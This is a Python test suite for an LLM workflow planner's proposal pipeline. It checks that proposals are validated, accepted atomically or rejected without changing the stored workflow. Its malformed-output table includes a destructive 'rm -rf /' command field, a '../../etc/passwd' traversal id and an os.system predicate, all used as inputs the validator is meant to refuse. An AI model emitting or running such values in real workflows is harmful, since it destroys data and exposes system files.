"""AAW PLANNER PROPOSAL PIPELINE V0.1 — proposal-only authority, proved.

These drive the real substrate: the real `workflow_schema.validate_workflow`,
the real `routing_contract` projection and semantic hash, the real bridge write
path and the real `draft_history.js` the canvas loads. Only one thing is
substituted — `aaw_planner.provider_planner`, the documented provider seam —
because the point of this pipeline is what AAW does with planner output, not
what a provider says.

Where each acceptance criterion of the objective is proved:

  1  generation changes no executable semantics
        test_generating_a_proposal_changes_nothing_at_all
        test_an_invalid_proposal_changes_nothing_at_all
  2  Reject changes nothing               test_reject_discards_the_proposal_and_nothing_else
  3  Accept mutates atomically            test_accept_applies_the_whole_subgraph_or_none_of_it
                                          test_a_refused_save_during_accept_leaves_the_old_workflow
  4  a stale Accept changes nothing       test_slice_c_a_stale_proposal_is_refused_with_zero_mutation
  5  an invalid proposal changes nothing  test_every_malformed_planner_output_is_refused_fail_closed
  6  Accept participates in Undo/Redo     test_an_accepted_proposal_is_one_coherent_undo_transaction
  7  branch + MERGE validates correctly   test_slice_b_a_branch_and_merge_proposal
  8  existing RUN behaviour unaffected    test_a_run_of_the_extended_workflow_still_executes
                                          test_accept_is_refused_while_a_run_of_this_workflow_moves
  9  the frozen UI exposes it minimally   test_the_canvas_exposes_the_planner_minimally
                                          test_proposal_text_reaches_the_canvas_only_through_escaping
"""

from __future__ import annotations

import copy
import json
import re
import subprocess
import time
from pathlib import Path

import pytest

import aaw_bridge
import aaw_bridge_server
import aaw_llm_test_adapter
import aaw_planner
import aaw_planner_test_adapter as scripted
import planner_proposal as pp
import routing_contract as rc
import workflow_runner as runner
import workflow_schema

HERE = Path(__file__).parent
LIVE_CANVAS = HERE / "UI_PROTOTYPE" / "aaw-canvas-live.html"
HISTORY_JS = HERE / "UI_PROTOTYPE" / "draft_history.js"
WORKFLOW_ID = "PLANNER_SLICE_V1"


# ───────────────────────────── fixtures ─────────────────────────────

def _git(argv, cwd):
    subprocess.run(argv, cwd=cwd, check=True, stdout=subprocess.PIPE,
                   stderr=subprocess.PIPE, text=True)


def _workspace(root: Path):
    root.mkdir(parents=True, exist_ok=True)
    repo, worktree = root / "repo", root / "worktree"
    repo.mkdir()
    _git(["git", "init", "-b", "main"], repo)
    _git(["git", "config", "user.email", "aaw@example.invalid"], repo)
    _git(["git", "config", "user.name", "AAW Planner Test"], repo)
    (repo / "README.md").write_text("baseline\n", encoding="utf-8")
    _git(["git", "add", "."], repo)
    _git(["git", "commit", "-m", "baseline"], repo)
    _git(["git", "worktree", "add", "-b", "aaw/planner", str(worktree)], repo)
    return repo, worktree


def _base_workflow(bridge) -> dict:
    """The graph every slice extends, authored entirely through the bridge.

        N01 IMPLEMENT ──E_N01_CONTINUE──▶ N02 REVIEW ──verdict PASS──▶ N09 HUMAN_GATE

    N01's single outgoing edge is unconditional on purpose: that is the case a
    planner must splice into rather than append to, and it is the case the
    FIRST_MATCH ordering rule makes non-trivial.
    """
    draft = bridge.blank_workflow(WORKFLOW_ID)              # one HUMAN_GATE, N01
    draft["nodes"][0]["id"] = "N09"
    draft["start_node"] = "N01"
    draft["nodes"] = [
        {"id": "N01", "type": "IMPLEMENT", "depends_on": [], "run_if": "ALWAYS",
         "role": "CODE_IMPLEMENTER", "capability": "CODE_IMPLEMENTER",
         "model": "gpt-5.6-sol", "effort": "medium", "routing": "FIRST_MATCH",
         "instructions": "Implement the supplied goal in the isolated worktree.",
         "acceptance": ["The requested behaviour is implemented."],
         "on_pass": None, "on_fail": None,
         "edges": [{"edge_id": "E_N01_CONTINUE", "to": "N02", "when": None,
                    "kind": "CONTINUE", "label": "continue"}]},
        {"id": "N02", "type": "REVIEW", "depends_on": ["N01"], "run_if": "ON_TRANSITION",
         "role": "INDEPENDENT_REVIEWER", "model": "gpt-5.6-sol", "effort": "high",
         "routing": "FIRST_MATCH",
         "instructions": "Review in a fresh, read-only context. Set `verdict`.",
         "acceptance": ["The review ran in a fresh read-only context."],
         "on_pass": None, "on_fail": None,
         "edges": [{"edge_id": "E_N02_PASS", "to": "N09", "when": {"verdict": "PASS"},
                    "kind": "CONTINUE", "label": "PASS"}]},
        {"id": "N09", "type": "HUMAN_GATE", "depends_on": [], "run_if": "ON_TRANSITION",
         "role": None, "model": None, "effort": None,
         "instructions": "Human acceptance. The runner never merges, pushes or opens a PR.",
         "acceptance": ["A human verdict is recorded against the candidate."],
         "on_pass": None, "on_fail": None},
    ]
    bridge.create_workflow(WORKFLOW_ID, draft)
    return draft


@pytest.fixture
def planner(tmp_path, monkeypatch):
    stats = tmp_path / "03_STATS"
    monkeypatch.setattr(runner, "STATS_ROOT", stats)
    workflows = tmp_path / "WORKFLOWS"
    workflows.mkdir()
    bridge = aaw_bridge.AawBridge(workflows_root=workflows, stats_root=stats)
    _base_workflow(bridge)
    return bridge, workflows / f"{WORKFLOW_ID}.json"


def plan(bridge, script, anchor="N01", *, instruction="", candidate=None):
    """One planning round trip against a scripted provider."""
    with aaw_planner.planner_adapter_scope(scripted.scripted_planner(script)):
        return bridge.plan_from_node(WORKFLOW_ID, anchor, instruction=instruction,
                                     candidate=candidate)


def snapshot(path: Path) -> tuple[bytes, str]:
    """The file exactly as it is, and what it means. Both must survive."""
    raw = path.read_bytes()
    return raw, rc.semantic_hash(json.loads(raw.decode("utf-8")))


# ── the three vertical slices, as planner scripts ──

SLICE_A = {"anchors": {"N01": {
    "intent": "Insert a bounded research pass and an independent review before the existing review.",
    "detach_edges": ["E_N01_CONTINUE"],
    "nodes": [
        {"id": "P01", "type": "IMPLEMENT", "role": "RESEARCH_SYNTHESIZER",
         "capability": "RESEARCH_SYNTHESIZER", "effort": "medium",
         "instructions": "Research the affected surface and synthesise a bounded note.",
         "acceptance": ["A bounded synthesis exists.", "No scope was widened."],
         "depends_on": ["N01"], "run_if": "ON_TRANSITION"},
        {"id": "P02", "type": "REVIEW", "role": "INDEPENDENT_REVIEWER", "effort": "high",
         "instructions": "Review the research note in a fresh read-only context. Set `verdict`.",
         "acceptance": ["The review ran read-only."],
         "depends_on": ["P01"], "run_if": "ON_TRANSITION"},
    ],
    "edges": [
        {"edge_id": "E_N01_P01", "from": "N01", "to": "P01", "when": None,
         "kind": "CONTINUE", "label": "research"},
        {"edge_id": "E_P01_P02", "from": "P01", "to": "P02", "when": None,
         "kind": "CONTINUE", "label": "review"},
        {"edge_id": "E_P02_N02", "from": "P02", "to": "N02", "when": None,
         "kind": "CONTINUE", "label": "continue"},
    ],
    "assumptions": ["The research belongs on the main path, not a branch."],
    "warnings": ["This lengthens the path by two LLM nodes."],
}}}

SLICE_B = {"anchors": {"N01": {
    "intent": "Fan out into two bounded branches, rejoin through a MERGE, then review.",
    "detach_edges": ["E_N01_CONTINUE"],
    "anchor_routing": "ALL_MATCHES",
    "nodes": [
        {"id": "B01", "type": "IMPLEMENT", "role": "CODE_IMPLEMENTER",
         "capability": "CODE_IMPLEMENTER", "effort": "medium",
         "instructions": "Branch: hardening. Honour every carry_forward constraint.",
         "acceptance": ["Hardening is applied without widening the goal."],
         "depends_on": ["N01"], "run_if": "ON_TRANSITION"},
        {"id": "B02", "type": "IMPLEMENT", "role": "CODE_IMPLEMENTER",
         "capability": "CODE_IMPLEMENTER", "effort": "medium",
         "instructions": "Branch: migration. Honour every carry_forward constraint.",
         "acceptance": ["The migration is forward-only and has a dry-run mode."],
         "depends_on": ["N01"], "run_if": "ON_TRANSITION"},
        {"id": "M01", "type": "MERGE", "merge_policy": "ALL_REQUIRED",
         "expected_incoming": ["E_B01_M01", "E_B02_M01"],
         "instructions": "Rejoin both branches before the review.",
         "acceptance": ["Both branches are represented, source-attributed."],
         "depends_on": [], "run_if": "ON_TRANSITION"},
        {"id": "R01", "type": "REVIEW", "role": "INDEPENDENT_REVIEWER", "effort": "high",
         "instructions": "Review the merged candidate read-only. Set `verdict`.",
         "acceptance": ["The review ran read-only over the merged package."],
         "depends_on": ["M01"], "run_if": "ON_TRANSITION"},
    ],
    "edges": [
        {"edge_id": "E_N01_B01", "from": "N01", "to": "B01", "when": None,
         "kind": "CONTINUE", "label": "hardening"},
        {"edge_id": "E_N01_B02", "from": "N01", "to": "B02", "when": None,
         "kind": "CONTINUE", "label": "migration"},
        {"edge_id": "E_B01_M01", "from": "B01", "to": "M01", "when": None,
         "kind": "CONTINUE", "label": "rejoin"},
        {"edge_id": "E_B02_M01", "from": "B02", "to": "M01", "when": None,
         "kind": "CONTINUE", "label": "rejoin"},
        {"edge_id": "E_M01_R01", "from": "M01", "to": "R01", "when": None,
         "kind": "CONTINUE", "label": "review"},
        {"edge_id": "E_R01_N02", "from": "R01", "to": "N02", "when": None,
         "kind": "CONTINUE", "label": "continue"},
    ],
    "assumptions": ["Both branches are independent and may run concurrently."],
    "warnings": [],
}}}


# ══════════════════ 1. the planner mutates nothing ══════════════════

def test_generating_a_proposal_changes_nothing_at_all(planner):
    """§7 immutability before Accept, measured rather than asserted."""
    bridge, path = planner
    before_bytes, before_hash = snapshot(path)
    before_mtime = path.stat().st_mtime_ns

    frame = plan(bridge, SLICE_A, instruction="add a research pass")

    assert frame["status"] == pp.PROPOSAL_READY, frame["diagnostics"]
    after_bytes, after_hash = snapshot(path)
    assert after_bytes == before_bytes                      # byte-identical file
    assert path.stat().st_mtime_ns == before_mtime          # not even rewritten
    assert after_hash == before_hash                        # identical semantics
    # the bridge measures it too, on both sides of the whole round trip
    assert frame["base_semantic_hash"] == before_hash
    assert frame["base_semantic_hash_after"] == before_hash
    # the proposal is not in the executable graph
    definition = json.loads(path.read_text(encoding="utf-8"))
    assert {node["id"] for node in definition["nodes"]} == {"N01", "N02", "N09"}
    assert bridge.graph_projection(WORKFLOW_ID)["semantic_hash"] == before_hash


def test_the_preview_is_a_projection_and_never_a_workflow(planner):
    """The applied graph exists only as a drawable preview until acceptance."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    preview = frame["preview"]
    assert preview["semantic_hash"] != frame["base_semantic_hash"]
    drawn = {node["node_id"] for node in preview["projection"]["nodes"]}
    assert {"P01", "P02"} <= drawn
    # ... and none of it reached disk
    assert snapshot(path)[1] == frame["base_semantic_hash"]
    assert list(path.parent.glob("*.json")) == [path]


def test_a_planner_proposal_cannot_reach_the_runner_or_a_worktree(planner):
    """§5: the planner has no execution authority and no runtime surface."""
    bridge, _ = planner
    frame = plan(bridge, SLICE_A)
    assert bridge.list_runs()["runs"] == []
    assert frame["proposal"]["nodes"], "the proposal is real"
    # nothing in the proposal contract can carry an argv, a model or a path
    for node in frame["proposal"]["nodes"]:
        assert set(node) <= set(pp.PROPOSAL_NODE_FIELDS)
        assert "command" not in node and "model" not in node and "preprocess" not in node
    source = Path(aaw_bridge.__file__).read_text(encoding="utf-8")
    body = source[source.index("def plan_from_node"):source.index("def _store_invalid")]
    for forbidden in ("atomic_json", "save_workflow", "start_run", "self.runner"):
        assert forbidden not in body, f"plan_from_node must not be able to reach {forbidden}"


# ══════════════════ 2. proposal identity ══════════════════

def test_proposal_identity_is_deterministic_over_content(planner):
    bridge, _ = planner
    first = plan(bridge, SLICE_A)["proposal"]
    second = plan(bridge, SLICE_A)["proposal"]
    assert first["proposal_id"] == second["proposal_id"]
    assert pp.proposal_hash(first) == pp.proposal_hash(second)


def test_proposal_identity_ignores_order_and_volatile_fields(planner):
    bridge, _ = planner
    proposal = plan(bridge, SLICE_A)["proposal"]
    shuffled = copy.deepcopy(proposal)
    shuffled["nodes"].reverse()
    shuffled["edges"].reverse()
    assert pp.proposal_hash(shuffled) == pp.proposal_hash(proposal)

    decorated = copy.deepcopy(proposal)
    for field in pp.VOLATILE_PROPOSAL_FIELDS:
        decorated[field] = {"noise": time.time()}
    decorated["viewport"] = {"x": 1, "y": 2, "k": 3}
    assert pp.proposal_hash(decorated) == pp.proposal_hash(proposal)


def test_proposal_identity_moves_when_the_mutation_moves(planner):
    bridge, _ = planner
    proposal = plan(bridge, SLICE_A)["proposal"]
    changed = copy.deepcopy(proposal)
    changed["nodes"][0]["effort"] = "high"
    assert pp.proposal_hash(changed) != pp.proposal_hash(proposal)


def test_the_planning_package_is_bounded_and_inspectable(planner):
    bridge, _ = planner
    frame = plan(bridge, SLICE_A, instruction="keep it small")
    package = frame["package"]
    assert package["anchor"]["node_id"] == "N01"
    assert package["operator_instruction"] == "keep it small"
    assert package["neighborhood"]["included_node_ids"], "the neighbourhood is stated"
    assert package["package_bytes"] <= pp.DEFAULT_LIMITS.max_package_bytes
    # The package is a closed set of keys, not "whatever we had lying around":
    # no repository, no run, no journal, no telemetry, no filesystem path.
    assert set(package) == {
        "package_version", "proposal_version", "workflow", "base_semantic_hash",
        "anchor", "neighborhood", "existing_node_ids", "existing_edge_ids",
        "constraints", "rules", "limits", "operator_instruction", "response_schema",
        "package_bytes"}
    assert set(package["workflow"]) == {"workflow_id", "version", "description",
                                        "start_node", "limits", "node_count"}
    for key in ("run_id", "execution_id", "worktree", "repo", "routing_events",
                "telemetry", "artifacts", "goal"):
        assert key not in package, f"the planning package carries {key}"
    # every string in it is graph content or a rule, never a path on this machine
    def walk(value):
        if isinstance(value, str):
            assert not re.match(r"^(?:[A-Za-z]:[\/]|/|\\)", value), value
        elif isinstance(value, dict):
            [walk(item) for item in value.values()]
        elif isinstance(value, list):
            [walk(item) for item in value]
    walk(package)
    assert frame["input_hash"] == pp.package_hash(package)


# ══════════════════ 3. deterministic validation, fail-closed ══════════════════

def _slice_a_with(mutate) -> dict:
    script = copy.deepcopy(SLICE_A)
    mutate(script["anchors"]["N01"])
    return script


MALFORMED = {
    "planner returned a list": ({"anchors": {"N01": {"raw": ["not", "an", "object"]}}},
                                pp.INVALID_SHAPE),
    "planner returned a string": ({"anchors": {"N01": {"raw": "{}"}}}, pp.INVALID_SHAPE),
    "unsupported node type": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("type", "MACHINE_GATE")), pp.INVALID_NODE_TYPE),
    "unknown node type entirely": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("type", "DEPLOY")), pp.INVALID_NODE_TYPE),
    "duplicate node id": (_slice_a_with(
        lambda e: e["nodes"][1].__setitem__("id", "P01")), pp.INVALID_DUPLICATE),
    "collides with an existing node": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("id", "N02")), pp.INVALID_COLLISION),
    "edge to a node that does not exist": (_slice_a_with(
        lambda e: e["edges"][2].__setitem__("to", "N77")), pp.INVALID_EDGE_REF),
    "edge from a node it may not leave": (_slice_a_with(
        lambda e: e["edges"][2].__setitem__("from", "N02")), pp.INVALID_EDGE_SOURCE),
    "duplicate edge id": (_slice_a_with(
        lambda e: e["edges"][1].__setitem__("edge_id", "E_N01_P01")), pp.INVALID_DUPLICATE),
    "edge id collides with the graph": (_slice_a_with(
        lambda e: e["edges"][1].__setitem__("edge_id", "E_N02_PASS")), pp.INVALID_COLLISION),
    "detaching an edge it does not own": (_slice_a_with(
        lambda e: e.__setitem__("detach_edges", ["E_N02_PASS"])), pp.INVALID_DETACH),
    "a field the contract does not carry": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("command", ["rm", "-rf", "/"])), pp.INVALID_FIELD),
    "a model the planner chose": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("model", "gpt-5.6-sol")), pp.INVALID_FIELD),
    "an invented top-level field": (_slice_a_with(
        lambda e: e.__setitem__("execute_now", True)), pp.INVALID_FIELD),
    "a control character in a brief": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("instructions", "do it\x07\x00now")), pp.INVALID_TEXT),
    "a role outside the closed set": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("role", "ROOT")), pp.INVALID_SHAPE),
    "an effort outside the closed set": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("effort", "unlimited")), pp.INVALID_SHAPE),
    "a node id that is not an id": (_slice_a_with(
        lambda e: e["nodes"][0].__setitem__("id", "../../etc/passwd")), pp.INVALID_NODE_ID),
    "a predicate V0.1 has no DSL for": (_slice_a_with(
        lambda e: e["edges"][0].__setitem__("when", {"python": "os.system('x')"})),
        pp.INVALID_EDGE_REF),
    "a non-empty replacements set": (_slice_a_with(
        lambda e: e.__setitem__("replacements", [{"id": "N02"}])), pp.INVALID_FIELD),
}


@pytest.mark.parametrize("label", sorted(MALFORMED))
def test_every_malformed_planner_output_is_refused_fail_closed(planner, label):
    """§18: every named failure mode, each one leaving the workflow untouched."""
    bridge, path = planner
    script, expected = MALFORMED[label]
    before_bytes, before_hash = snapshot(path)

    frame = plan(bridge, script)

    assert frame["status"] == pp.PROPOSAL_INVALID, label
    codes = {row.get("code") for row in frame["diagnostics"]}
    assert expected in codes, f"{label}: expected {expected}, got {codes} — {frame['errors']}"
    assert snapshot(path) == (before_bytes, before_hash), f"{label} mutated the workflow"
    assert frame["base_semantic_hash_after"] == before_hash


def test_an_invalid_proposal_changes_nothing_at_all(planner):
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, MALFORMED["duplicate node id"][0])
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert snapshot(path) == before
    # and it cannot be accepted
    listing = bridge.list_proposals(WORKFLOW_ID)["proposals"]
    for row in listing:
        if row["status"] == pp.PROPOSAL_INVALID:
            with pytest.raises(aaw_bridge.BridgeError) as exc:
                bridge.accept_proposal(row["proposal_id"])
            assert exc.value.code == aaw_bridge.PROPOSAL_NOT_ACCEPTABLE
    assert snapshot(path) == before


def test_a_cycle_is_refused_by_the_real_validator(planner):
    """Graph legality stays the schema's decision, not a second rule set."""
    bridge, path = planner
    before = snapshot(path)
    # Declared before P02's unconditional edge, so the FIRST_MATCH ordering
    # rule is satisfied and the *cycle* is the only thing left to refuse.
    script = _slice_a_with(lambda e: e["edges"].insert(2,
        {"edge_id": "E_P02_P01", "from": "P02", "to": "P01",
         "when": {"verdict": "REPAIR"}, "kind": "CONTINUE", "label": "loop"}))
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert any("acyclic" in row["message"] for row in frame["diagnostics"]), frame["errors"]
    assert {row["source"] for row in frame["diagnostics"]} == {"SCHEMA"}
    assert snapshot(path) == before


def test_an_unreachable_proposed_node_is_refused(planner):
    bridge, path = planner
    before = snapshot(path)
    def orphan(entry):
        entry.pop("detach_edges")          # N01 keeps its own route
        entry["edges"] = entry["edges"][1:]  # ... and nothing routes to P01
    script = _slice_a_with(orphan)
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert any("unreachable" in row["message"] for row in frame["diagnostics"])
    assert snapshot(path) == before


def test_an_invalid_merge_proposal_is_refused_by_the_merge_contract(planner):
    """A MERGE's incoming set is closed; a proposal cannot open it."""
    bridge, path = planner
    before = snapshot(path)
    script = copy.deepcopy(SLICE_B)
    entry = script["anchors"]["N01"]
    merge = next(node for node in entry["nodes"] if node["id"] == "M01")
    merge["expected_incoming"] = ["E_B01_M01"]            # one slot, two arrivals
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert any("expected_incoming" in row["message"] for row in frame["diagnostics"])
    assert snapshot(path) == before


def test_splicing_into_an_existing_merge_is_refused_not_repaired(planner):
    """A known, deliberate V0.1 boundary, pinned so it cannot regress silently.

    Rerouting into a MERGE that already exists would change that MERGE's
    `expected_incoming`, which is existing structure. V0.1 refuses rather than
    quietly rewriting it; the documented workaround is to author the merge
    change by hand first, then plan.
    """
    bridge, path = planner
    before = snapshot(path)
    accepted = bridge.accept_proposal(plan(bridge, SLICE_B)["proposal"]["proposal_id"],
                                      persist=True)
    assert accepted["status"] == pp.PROPOSAL_ACCEPTED
    # now try to splice a node in front of the merge, from B01
    script = {"anchors": {"B01": {
        "intent": "insert a check before the rejoin",
        "detach_edges": ["E_B01_M01"],
        "nodes": [{"id": "C01", "type": "REVIEW", "role": "INDEPENDENT_REVIEWER",
                   "effort": "high", "instructions": "Check before rejoin.",
                   "acceptance": ["Checked."], "depends_on": ["B01"],
                   "run_if": "ON_TRANSITION"}],
        "edges": [{"edge_id": "E_B01_C01", "from": "B01", "to": "C01", "when": None,
                   "kind": "CONTINUE", "label": "check"},
                  {"edge_id": "E_C01_M01", "from": "C01", "to": "M01", "when": None,
                   "kind": "CONTINUE", "label": "rejoin"}]}}}
    after_accept = snapshot(path)
    frame = plan(bridge, script, anchor="B01")
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert any("expected_incoming" in row["message"] for row in frame["diagnostics"])
    assert snapshot(path) == after_accept
    assert before != after_accept                          # the first accept did land


def test_an_oversized_proposal_is_refused(planner):
    bridge, path = planner
    before = snapshot(path)
    script = copy.deepcopy(SLICE_A)
    entry = script["anchors"]["N01"]
    template = copy.deepcopy(entry["nodes"][0])
    for index in range(pp.DEFAULT_LIMITS.max_nodes + 2):
        node = copy.deepcopy(template)
        node["id"] = f"X{index:02d}"
        entry["nodes"].append(node)
    frame = plan(bridge, script)
    assert frame["status"] == pp.PROPOSAL_INVALID
    assert {row["code"] for row in frame["diagnostics"]} == {pp.INVALID_SIZE}
    assert snapshot(path) == before


def test_limits_are_configurable(monkeypatch):
    monkeypatch.setenv("AAW_PLANNER_MAX_NODES", "3")
    monkeypatch.setenv("AAW_PLANNER_MAX_EDGES", "nonsense")
    limits = pp.ProposalLimits.from_env()
    assert limits.max_nodes == 3
    assert limits.max_edges == pp.ProposalLimits().max_edges   # unreadable is ignored


def test_a_proposal_may_not_touch_protected_structure(planner):
    """The protection check is a measured diff, not a promise in a docstring."""
    bridge, _ = planner
    base = bridge.load_workflow(WORKFLOW_ID)["definition"]
    proposal = plan(bridge, SLICE_A)["proposal"]

    # A proposal that, applied, would rewrite an existing node is refused even
    # though every field of the proposal itself is well-formed.
    sabotaged = copy.deepcopy(base)
    next(n for n in sabotaged["nodes"] if n["id"] == "N02")["effort"] = "max"
    with pytest.raises(pp.ProposalRefusal) as exc:
        pp._protection_report(base, sabotaged, proposal)
    assert exc.value.code == pp.INVALID_PROTECTED

    for mutate in (lambda w: w.__setitem__("start_node", "N02"),
                   lambda w: w["limits"].__setitem__("max_nodes", 99),
                   lambda w: w["nodes"].pop()):
        broken = copy.deepcopy(base)
        mutate(broken)
        with pytest.raises(pp.ProposalRefusal) as exc:
            pp._protection_report(base, broken, proposal)
        assert exc.value.code == pp.INVALID_PROTECTED


# ══════════════════ 4. planner/provider failure ══════════════════

@pytest.mark.parametrize("code", [aaw_planner.PLANNER_DISPATCH_FAILED,
                                  aaw_planner.PLANNER_TIMEOUT,
                                  aaw_planner.PLANNER_UNAVAILABLE,
                                  aaw_planner.PLANNER_MALFORMED_OUTPUT])
def test_a_planner_failure_is_reported_and_mutates_nothing(planner, code):
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, {"anchors": {"N01": {"fail": code, "message": "no answer"}}})
    assert frame["status"] == pp.PLANNER_FAILED
    assert frame["proposal"] is None
    assert {row["code"] for row in frame["diagnostics"]} == {code}
    assert snapshot(path) == before
    assert frame["base_semantic_hash_after"] == before[1]
    types = [row["event_type"] for row in bridge.planner_events()["events"]]
    assert types == [pp.PLANNER_STARTED, pp.PLANNER_FAILED]


def test_an_adapter_that_explodes_is_a_planner_failure_not_a_crash(planner):
    bridge, path = planner
    before = snapshot(path)

    def broken(package, **kwargs):
        raise RuntimeError("provider SDK exploded")

    with aaw_planner.planner_adapter_scope(broken):
        frame = bridge.plan_from_node(WORKFLOW_ID, "N01")
    assert frame["status"] == pp.PLANNER_FAILED
    assert "provider SDK exploded" in frame["errors"][0]
    assert snapshot(path) == before


def test_the_planner_adapter_substitution_is_context_local(planner):
    bridge, _ = planner
    assert aaw_planner.current_planner_adapter() is aaw_planner.provider_planner
    with aaw_planner.planner_adapter_scope(scripted.scripted_planner(SLICE_A)):
        assert aaw_planner.current_planner_adapter() is not aaw_planner.provider_planner
    assert aaw_planner.current_planner_adapter() is aaw_planner.provider_planner


def test_an_unknown_anchor_is_refused_before_the_planner_is_called(planner):
    bridge, path = planner
    before = snapshot(path)
    called = {}
    with aaw_planner.planner_adapter_scope(scripted.scripted_planner(SLICE_A, captured=called)):
        with pytest.raises(aaw_bridge.BridgeError) as exc:
            bridge.plan_from_node(WORKFLOW_ID, "NOPE")
    assert exc.value.code == pp.INVALID_ANCHOR
    assert called == {}, "the planner must not be paid to answer an impossible question"
    assert snapshot(path) == before


def test_an_invalid_base_workflow_cannot_be_planned_over(planner):
    bridge, path = planner
    before = snapshot(path)
    broken = bridge.load_workflow(WORKFLOW_ID)["definition"]
    broken["nodes"][0]["edges"][0]["to"] = "GHOST"
    with aaw_planner.planner_adapter_scope(scripted.scripted_planner(SLICE_A)):
        with pytest.raises(aaw_bridge.BridgeError) as exc:
            bridge.plan_from_node(WORKFLOW_ID, "N01", candidate=broken)
    assert exc.value.code == aaw_bridge.PLANNER_BASE_INVALID
    assert snapshot(path) == before


# ══════════════════ 5. Accept ══════════════════

def test_accept_applies_the_whole_subgraph_or_none_of_it(planner):
    bridge, path = planner
    before_bytes, before_hash = snapshot(path)
    frame = plan(bridge, SLICE_A)

    report = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)

    assert report["status"] == pp.PROPOSAL_ACCEPTED
    assert report["previous_semantic_hash"] == before_hash
    assert report["semantic_hash"] != before_hash
    assert report["added_node_ids"] == ["P01", "P02"]
    assert report["detached_edge_ids"] == ["E_N01_CONTINUE"]
    assert report["persisted"] is True

    after = json.loads(path.read_text(encoding="utf-8"))
    assert rc.semantic_hash(after) == report["semantic_hash"]
    assert {node["id"] for node in after["nodes"]} == {"N01", "N02", "N09", "P01", "P02"}
    # the whole subgraph, or none of it: every proposed node and edge landed
    edge_ids = {edge["edge_id"] for node in after["nodes"] for edge in node.get("edges", [])}
    assert {"E_N01_P01", "E_P01_P02", "E_P02_N02"} <= edge_ids
    assert "E_N01_CONTINUE" not in edge_ids
    # and the result is a workflow the runner would load
    workflow_schema.validate_workflow(after)
    assert bridge.load_workflow(WORKFLOW_ID)["valid"] is True


def test_accept_without_persist_produces_a_candidate_and_writes_nothing(planner):
    """How the canvas accepts: the mutation lands in the draft, not on disk.

    Save stays the one path to the file, so an accepted proposal is undoable
    and discardable exactly like every other authoring edit.
    """
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, SLICE_A)
    report = bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=False)
    assert report["persisted"] is False
    assert report["save"] is None
    assert snapshot(path) == before
    assert {node["id"] for node in report["candidate"]["nodes"]} == \
        {"N01", "N02", "N09", "P01", "P02"}
    # ... and that candidate is exactly what the validated save path accepts
    saved = bridge.save_workflow(WORKFLOW_ID, report["candidate"],
                                 base_semantic_hash=before[1])
    assert saved["semantic_hash"] == report["semantic_hash"]


def test_an_inherited_model_is_recorded_never_invented(planner):
    bridge, _ = planner
    frame = plan(bridge, SLICE_A)
    assert frame["materialization"]["inherited_model"] == "gpt-5.6-sol"
    report = bridge.accept_proposal(frame["proposal"]["proposal_id"])
    proposed = next(n for n in report["candidate"]["nodes"] if n["id"] == "P01")
    assert proposed["model"] == "gpt-5.6-sol"          # the anchor's, not the planner's
    assert proposed["capability"] == "RESEARCH_SYNTHESIZER"
    assert "model" not in frame["proposal"]["nodes"][0]


def test_a_duplicate_accept_is_refused(planner):
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    proposal_id = frame["proposal"]["proposal_id"]
    first = bridge.accept_proposal(proposal_id, persist=True)
    after_first = snapshot(path)

    with pytest.raises(aaw_bridge.BridgeError) as exc:
        bridge.accept_proposal(proposal_id, persist=True)
    assert exc.value.code == aaw_bridge.PROPOSAL_ALREADY_RESOLVED
    assert snapshot(path) == after_first, "a duplicate Accept applied the mutation twice"
    assert first["semantic_hash"] == after_first[1]


def test_a_refused_save_during_accept_leaves_the_old_workflow(planner):
    """Atomicity through the existing write path: nothing partial, ever."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    before = snapshot(path)

    def refuse(*args, **kwargs):
        raise OSError("disk is gone")

    original = bridge.runner.atomic_json
    bridge.runner.atomic_json = refuse
    try:
        with pytest.raises(OSError):
            bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
    finally:
        bridge.runner.atomic_json = original
    assert snapshot(path) == before


def test_accept_is_refused_while_a_run_of_this_workflow_moves(planner, tmp_path):
    """§21: accepting a proposal is BUILD authoring, and BUILD authoring does
    not happen underneath a run that is still executing this graph."""
    bridge, path = planner
    frame = plan(bridge, SLICE_A)
    before = snapshot(path)
    repo, worktree = _workspace(tmp_path / "ws")
    script = {"delay_seconds": 2.0, "nodes": {"*": {"outcome": "PASS", "verdict": "PASS",
                                                    "summary": "scripted"}}}
    started = bridge.start_run(WORKFLOW_ID, goal="hold the graph", repo=repo,
                              worktree=worktree,
                              adapter=aaw_llm_test_adapter.scripted_adapter(script))
    try:
        deadline = time.monotonic() + 20
        while time.monotonic() < deadline:
            if bridge._handle(started["run_id"]).lifecycle == aaw_bridge.RUN_ACTIVE:
                break
            time.sleep(0.05)
        with pytest.raises(aaw_bridge.BridgeError) as exc:
            bridge.accept_proposal(frame["proposal"]["proposal_id"], persist=True)
        assert exc.value.code == aaw_bridge.PROPOSAL_RUN_ACTIVE
        assert snapshot(path) == before
    finally:
        bridge.cancel_run(started["run_id"], join_timeout=20.0)


# ══════════════════ 6. Reject ══════════════════

def test_reject_discards_the_proposal_and_nothing_else(planner):
    bridge, path = planner
    before = snapshot(path)
    frame = plan(bridge, SLICE_A)
    proposal_id = frame["proposal"]["proposal_id"]

    report = bridge.reject_proposal(proposal_id, reason="not what I meant")

    assert report["status"] == pp.PROPOSAL_REJECTED
    assert report["workflow_changed"] is False
    assert report["semantic_hash"] == before[1]
    assert snapshot(path) == before
    assert bridge.list_proposals(WORKFLOW_ID)["proposals"] == []
